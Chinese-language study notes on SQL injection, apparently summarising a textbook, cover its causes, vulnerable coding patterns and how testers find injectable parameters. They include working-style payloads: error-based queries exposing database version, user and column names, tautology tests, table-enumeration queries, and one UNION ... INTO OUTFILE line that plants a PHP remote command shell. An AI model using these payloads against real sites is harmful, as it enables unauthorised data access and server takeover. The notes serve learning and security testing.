第一章 什么是SQL injection
是一种通过影响SQL请求不经授权来获得、修改、删除数据库信息的漏洞。最早是在1998年由Rain Forest Puppy发表的文章“NT Web Technology Vulnerabilities”中出现。 
这种影响包括在应用参数输入中插入或拼接SQL命令来改变输入内容，而后由后台数据库解析执行。这种改变并不符合应用的原定设计逻辑，并可以暴露数据库内所有信息。
SQL注入漏洞发生的原因是：
1. 缺少用户输入过滤或过滤不足，让恶意参数可以通过。
2. 数据和控制信息混合在一起，并能同时得到执行。

资源OWASP, Zone-H
可能引起SQL注入的场景：
1. Dynamic String Bulding. 通过字符串操作动态组装SQL命令，通过输入参数注入恶意内容。parameterized queries可以防止类似问题。
2. Incorrectly Handled Escape Characters. 通过使用' 来测试攻击对象是否可能存在sql注入漏洞。其他特殊字符也有可能导致类似问题，例如oracle里的空格、||, . */ "。
3. Incorrectly Handled Types. 直接在不使用'字符的语句中使用UNION语句来接入另外的SQL语句。
特殊例子，使用语句 UNION SELECT “<? system($_REQUEST[‘cmd’]); ?>” INTO OUTFILE “/var/www/html/victim.com/cmd.php” -- 来向php文件中写入remote shell。
4. Incorrectly Handled Query Assembly. 在代码中利用参数指定所要操作的数据库表来动态组装SQL，比第一类更灵活。攻击者可以利用参数来直接指定SQL语句操作哪些数据内容而不仅限于特定的数据库表。
5. Incorrectly Handled Errors. 代码直接将数据库错误返回到用户界面，从而暴露数据库内容。例如SELECT * FROM table WHERE ID=' and 1 in (SELECT @@version) --
6. Incorrectly Handled Multiple Submissions. 在连续多个列表提交中，攻击者可以跳过前面的步骤直接通过URL调用后面的列表提交操作，通常后面没有太多限制。
http://www.victim.com/form.php?form=form2&param=' SQL Success --

数据库配置本身也会影响安全，需要注意不同权限的操作要用不同的数据库用户来操作。数据库的metadata MySQL:INFORMATION_SCHEMA, Oracle: ALL_TABLES, ALL_TAB_COLUMNS, 
-- Oracle statement to enumerate all accessible tables for the current user
SELECT OWNER, TABLE_NAME FROM ALL_TABLES ORDER BY TABLE_NAME;
-- MySQL statement to enumerate all accessible tables and databases for the
-- current user
SELECT table_schema, table_name FROM information_schema.tables;
-- MS SQL statement to enumerate all accessible tables using the system
-- tables
SELECT name FROM sysobjects WHERE xtype = 'U';
-- MS SQL statement to enumerate all accessible tables using the catalog
-- views
SELECT name FROM sys.tables;

第二章 测试SQL注入攻击
攻击方式就是使用异常数据作为输入来触发程序运行异常：发现所有Web应用的数据入口，了解什么样的输入可能触发异常，从服务返回中发现异常。
攻击的首要问题是了解数据库类型和版本。
攻击点：GET request, POST request, Cookie, Host, Referer, User-Agent.
攻击方法：控制URL参数。php参数
tips:
如果输入如下URL可以得到相同的回复，则说明可能存在SQL注入的漏洞：
SQL Server & Oracle:
http://www.victim.com/showproducts.php?category=bikes
http://www.victim.com/showproducts.php?category=bi'+'kes
MySQL:
http://www.victim.com/showproducts.php?category=bikes
http://www.victim.com/showproducts.php?category=bi' 'kes

SQL错误会返回并出现在哪里：
1. 返回到页面并且用户可见
2. 返回到页面并且页面代码内可见
3. 转到其他错误页面
4. 返回500或302
5. 无任何页面返回信息或只有通用信息。

利用错误信息了解系统
SQL server errors:
请求：http://www.victim.com/showproducts.aspx?category=attacker'
Server Error in '/' Application. Unclosed quotation mark before the character string 'attacker;'. Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information
about the error and where it originated in the code. Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark before the character string 'attaker;'.
请求：http://www.victim.com/showproduct.aspx?id=attacker
Server Error in '/' Application. Invalid column name 'attacker'. Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information
about the error and where it originated in the code. Exception Details: System.Data.SqlClient.SqlException: Invalid column name 'attacker'.
请求显示数据库版本：http://www.victim.com/showproducts.aspx?category=bikes' and 1=0/@@version;--
Server Error in '/' Application. Syntax error converting the nvarchar value 'Microsoft SQL Server 2000 – 8.00.760 (Intel X86) Dec 17 2002 14:22:05 Copyright (c) 1988-2003 Microsoft
Corporation Enterprise Edition on Windows NT 5.2 (Build 3790: ) ' to a column of data type int.
请求显示用户名：http://www.victim.com/showproducts.aspx?category=bikes' and 1=0/user;--
Syntax error converting the nvarchar value 'dbo' to a column of data type int.
请求显示数据库字段信息：
1.http://www.victim.com/showproducts.aspx?category=bikes' having 1'='1
Server Error in '/' Application. Column 'products.productid' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.
2.http://www.victim.com/showproducts.aspx?category=bikes' GROUP BY productid having '1'='1
Server Error in '/' Application. Column 'products.name' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
3.http://www.victim.com/showproducts.aspx?category=bikes' GROUP BY productid,name having '1'='1
Server Error in '/' Application. Column 'products.price' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
4.http://www.victim.com/showproducts.aspx?category=bikes' and 1=0/name;--
Server Error in '/' Application. Syntax error converting the nvarchar value 'Claud Butler Olympus D2' to a column of data type int.

mysql errors:
1. Warning: mysql_fetch_assoc(): supplied argument is not a valid MySQL result
2. You have an error in your SQL syntax;
3. Error: Unknown column 'attacker' in 'where clause'

Oracle errors:
1. java.sql.SQLException: ORA-00933: SQL command not properly ended at
2. 语句需要用'结尾，如果没有则会出现后面的内容。Error: SQLException java.sql.SQLException: ORA-01756: quoted string not properly terminated
Exception Details: System.Data.OleDb.OleDbException: One or more errors occurred during processing of command. ORA-00933: SQL command not properly ended
3. ociparse()用于准备Oracle执行语句。Warning: ociparse() [function.ociparse]: ORA-01756: quoted string not properly terminated
4. Warning: ociexecute(): supplied argument is not a valid OCI8-Statement resource
5. 当攻击者遇到嵌套SQL命令时，如果在操作嵌套内SQL语句时把嵌套外SQL语句的后续部分注释掉之后，会出现类似错误。java.sql.SQLException: ORA-00907: missing right parenthesis

应用返回的错误
由于应用通常会屏蔽数据库错误，使得SQL injection问题更加隐蔽。没有通用的准则来判断应用是否存在注入漏洞，同时新的攻击场景层出不穷，那么只能认真的从各种细节判断。
发现注入漏洞的流程通常包括：识别用户数据传输入口、修改传入应用的用户数据、发现从应用返回的变化结果。

要注意区分应用本身的错误和数据库的错误。
可以尝试的注入内容：
永真句：SELECT * FROM products WHERE category='bikes' OR '1'='1'，问题是如果表太大，很容易花很长时间才能得到结果。
永假句：SELECT * FROM products WHERE category='bikes' AND '1'='2'，通常不会有任何输出，但是可以配合UNION语句执行后续内容。

HTTP错误码：
SQL语句发生错误时通常引起HTTP 500错误码。有时也会被HTTP 302应用引导到特定的错误页面。

应答的数据量大小区别也能作为一种错误码，甚至于微小的变化都可能代表有可以利用的机会。其他的变化也可以当做指示器，例如是否显示产品标识、是否有用户数据出现。
盲注正是利用这种细微差别来识别并最终利用注入漏洞。

